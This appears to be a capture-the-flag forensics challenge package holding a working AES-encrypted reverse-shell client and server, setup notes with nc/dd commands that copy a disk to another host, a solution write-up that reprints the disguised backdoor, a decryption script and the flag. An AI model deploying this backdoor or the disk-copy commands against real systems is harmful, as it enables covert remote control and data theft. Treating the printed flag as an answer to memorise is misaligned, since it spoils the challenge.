{
    "capture.pcap": "[Binary file or unsupported type: pcap]",
    "client.py": "from Crypto.Cipher import AES\nfrom secrets import token_bytes\nfrom time import sleep\nimport socket\nimport struct\nimport subprocess\n\nkey = token_bytes(32)\n\ndef enc_send(sock, msg):\n    nonce = token_bytes(12)\n    aes = AES.new(key, AES.MODE_GCM, nonce)\n    enc_msg = aes.encrypt(msg)\n    sock.sendall(struct.pack('<Q', len(enc_msg)))\n    sock.sendall(enc_msg)\n    sock.sendall(nonce)\n\ndef enc_recv(sock):\n    nbytes = struct.unpack('<Q', sock.recv(8))[0]\n    enc_msg = sock.recv(nbytes)\n    nonce = sock.recv(12)\n    aes = AES.new(key, AES.MODE_GCM, nonce)\n    return aes.decrypt(enc_msg)\n\n\ndef main():\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect(('3.83.112.42', 4444))\n    sock.setblocking(True)\n    sock.sendall(key)\n    \n    while True:\n        cmd = enc_recv(sock)\n        print(cmd)\n        if cmd == b'disconnect':\n            return\n        try:\n            out = subprocess.check_output(['sh', '-c', cmd])\n        except:\n            out = b'command failed'\n        enc_send(sock, out)\n\n\nif __name__ == \"__main__\":\n    main()\n",
    "gen.md": "Instructions for generating the artifacts for this challenge\n\nSetup:\n1. Set up 2 hosts that can communicate with each other (2 ec2 instances, a host machine and a VM, literally any 2 devices that can run python)\n2. Copy `client.py` to one host (hereafter referred to as the client) and copy `server.py` to the other host (hereafter referred to as the server)\n3. The scripts depend on pyCryptodome, so `python3 -m pip install pyCryptodome` if it is not on the hosts.\n4. Modify client script to connect to server's IP. Hide client in whatever way is cool.\n\nAcquiring the pcap:\n1. Run tcpdump on client, `tcpdump -i eth0 -w capture.pcap host <IP>`, where `<IP>` is the server's IP\n2. Run server, then run client.\n3. Execute whatever garbage commands you want, at some point execute a command containing the flag (e.g. `echo gigem{s1mpl3_tr4ff1c_d3crypt10n}`)\n4. Acquire pcap from client.\n\nAcquiring the image:\nJust dd if you know how, this walks through getting the image from an ec2 instance.\nNote that you should make sure the server has enough space to copy the entire memory of the client to it, otherwise you'll run into memory issues.\n1. On the server, run `nc -l 19000|bzip2 -d|dd bs=16M of=./disk.img`\n2. On the client, run `dd bs=16M if=<DEV>|bzip2 -c|nc <IP> 19000`, where `<DEV>` is the device you want to copy over, and `<IP>` is the server's IP\n    - If you don't know what device to copy, run `df -h` and look for the one that is mounted on `/`\n3. Compress it or whatever and copy it down via ssh.\n",
    "Makefile": "dist:\n\tzip sourced-traffic.zip capture.pcap\n\nclean:\n\trm sourced-traffic.zip\n",
    "README.md": "# Sourced Traffic\n\nAuthor: `anomie`\n\nSaw suspicious traffic from one of our aws instances to an unusual port. We grabbed an image of the instance. See if you can figure out what is in the traffic\n\nDisk image is at https://drive.google.com/file/d/19_B6LtovtjPmHE3Cv0uZgt7-IYxOHMiN/view?usp=sharing\n\n## Dev Notes\nGiven files can be acquired with the command `make dist`, which produces a zip with the traffic capture file. Link to disk image is in the challenge description.\n\n\n## Solution\nUnpacking the provided disk image with `tar xJf disk.img.tar.xf`, we have:\n```\n> file disk.img\ndisk.img: SGI XFS filesystem data (blksz 4096, inosz 512, v2 dirs)\n```\nTo take a further look, we can just mount the image.\n```\nsudo mkdir /mnt/chall\nsudo mount -o loop disk.img /mnt/chall\n```\nFirst, let's check out `.bash_history` of the `ec2-user`:\n```\nsudo su\nexit\nsudo su\nexit\n```\nLooking at the root home directory, there's a `flag.txt` that just says `lmao`, so that's probably not the actual flag. `.bash_history` is symlinked to (our) `/dev/null`, but `.python_history` shows `from Crypto.Cipher import AES`, which looks interesting.\n\nRunning `grep -r \"from Crypto.Cipher import AES\"`, there's a match in `/usr/bin/upkeep`. The source is reproduced below:\n\n```python\n#!/bin/python3\n\nfrom Crypto.Cipher import AES\nfrom secrets import token_bytes\nfrom time import sleep\nimport socket\nimport struct\nimport subprocess\n\nkey = token_bytes(32)\n\ndef enc_send(sock, msg):\n    nonce = token_bytes(12)\n    aes = AES.new(key, AES.MODE_GCM, nonce)\n    enc_msg = aes.encrypt(msg)\n    sock.sendall(struct.pack('<Q', len(enc_msg)))\n    sock.sendall(enc_msg)\n    sock.sendall(nonce)\n\ndef enc_recv(sock):\n    nbytes = struct.unpack('<Q', sock.recv(8))[0]\n    enc_msg = sock.recv(nbytes)\n    nonce = sock.recv(12)\n    aes = AES.new(key, AES.MODE_GCM, nonce)\n    return aes.decrypt(enc_msg)\n\n\ndef main():\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect(('3.83.112.42', 4444))\n    sock.setblocking(True)\n    sock.sendall(key)\n\n    while True:\n        cmd = enc_recv(sock)\n        print(cmd)\n        if cmd == b'disconnect':\n            return\n        try:\n            out = subprocess.check_output(['sh', '-c', cmd])\n        except:\n            out = b'command failed'\n        enc_send(sock, out)\n\n\nif __name__ == \"__main__\":\n    main()\n```\n\n\nThe client communicates with a hardcoded destination of 3.83.112.42 on TCP port 4444, so we can filter by `ip.dst == 3.83.112.42 && tcp.port == 4444` in Wireshark, follow the TCP stream, then export the conversation as raw bytes. The client initially sends a random 32-byte key for AES-GCM. All subsequent messages from both the client and the server are structured as 8 bytes of ciphertext length in little-endian, followed by the bytes of the actual ciphertext, then 12 bytes for a nonce. See `solve.py` for details.\n\nFlag: `gigem{s1mpl3_tr4ff1c_d3crypt10n}`\n",
    "server.py": "from Crypto.Cipher import AES\nfrom secrets import token_bytes\nimport socket\nimport struct\n\nkey = b'A'*32\n\ndef enc_send(sock, msg):\n    nonce = token_bytes(12)\n    aes = AES.new(key, AES.MODE_GCM, nonce)\n    enc_msg = aes.encrypt(msg)\n    sock.sendall(struct.pack('<Q', len(enc_msg)))\n    sock.sendall(enc_msg)\n    sock.sendall(nonce)\n\n\ndef enc_recv(sock):\n    nbytes = struct.unpack('<Q', sock.recv(8))[0]\n    enc_msg = sock.recv(nbytes)\n    nonce = sock.recv(12)\n    aes = AES.new(key, AES.MODE_GCM, nonce)\n    return aes.decrypt(enc_msg)\n\ndef main():\n    ssock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    ssock.bind(('', 4444))\n    ssock.listen()\n    print(\"Listening\")\n\n    (csock, addr) = ssock.accept()\n    csock.settimeout(2)\n    print(f\"Connection received from {addr}\")\n    \n    global key\n    key = csock.recv(32) \n\n    while True:\n        cmd = input(\"> \").encode()\n        enc_send(csock, cmd)\n        if cmd == b'disconnect':\n            return\n        print(enc_recv(csock).decode())\n\n\nif __name__ == \"__main__\":\n    main()\n",
    "solve.py": "from Crypto.Cipher import AES\nfrom struct import unpack\nfrom pathlib import Path\n\nclass Parser:\n    def __init__(self, path):\n        self.buf = Path(path).read_bytes()\n        self.key = self.advance(32)\n    def advance(self, n):\n        ret = self.buf[:n]\n        self.buf = self.buf[n:]\n        return ret\n    def get_len(self):\n        big = self.advance(8)\n        return unpack(\"<Q\", big)[0]\n    def parse_msg(self):\n        n = self.get_len()\n        ct = self.advance(n)\n        iv = self.advance(12)\n        aes = AES.new(self.key, AES.MODE_GCM, iv)\n        pt = aes.decrypt(ct)\n        return pt.decode()\n    def decrypt(self):\n        ret = []\n        while len(self.buf) != 0:\n            ret.append(self.parse_msg())\n        return ret\n\nfor msg in Parser(\"stream\").decrypt():\n    print(msg)\n",
    "stream": "[Binary file or unsupported type: c:\\users\\jomue\\tamuctf-2023-master\\tamuctf-2023-master\\forensics\\sourced-traffic\\stream]",
    "category": "forensics"
}